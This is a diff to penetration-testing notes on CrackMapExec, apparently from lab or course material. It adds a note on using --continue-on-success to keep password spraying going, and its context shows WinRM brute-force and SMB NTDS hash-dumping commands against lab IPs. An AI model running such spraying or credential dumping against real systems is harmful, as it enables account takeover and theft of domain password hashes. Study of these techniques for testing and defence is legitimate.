@@ -30,6 +30,11 @@ crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordl
 ```shell-session
 crackmapexec winrm 10.129.42.197 -u user.list -p password.list
 ```
+
+> [!NOTE]
+> By default CME will exit after a successful login is found. Using the `--continue-on-success` flag will continue spraying even after a valid password is found.
+
+[web.archive.org/web/20220129050920/https://mpgn.gitbook.io/crackmapexec/getting-started/using-credentials](https://web.archive.org/web/20220129050920/https://mpgn.gitbook.io/crackmapexec/getting-started/using-credentials)
 ### Options
 
 ```shell-session
@@ -95,7 +100,6 @@ Using an account with admin privileges:
 ```shell-session
 crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
 ```
-
 
 ## Pass the Hash
 
